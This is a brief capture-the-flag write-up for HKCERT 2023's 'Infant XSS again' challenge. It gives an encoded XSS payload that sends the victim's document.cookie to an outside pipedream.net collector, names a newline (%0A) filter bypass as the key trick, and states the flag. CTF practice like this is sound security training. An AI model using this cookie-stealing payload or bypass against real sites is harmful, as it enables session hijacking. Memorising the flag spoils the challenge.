# Infant XSS again

payload:

```
http://infantxss-xsw7tt.hkcert23.pwnable.hk:28314/?payload=%0Awindow.location%3D%27https%3A%2F%2Feou6qllnt3mb4pl.m.pipedream.net%2F%3Fcookie%3D%27%2Bdocument.cookie
```
the key of this challenge is the newline character `%0A`

flag: hkcert23{worst_then_sanitary_cheque}
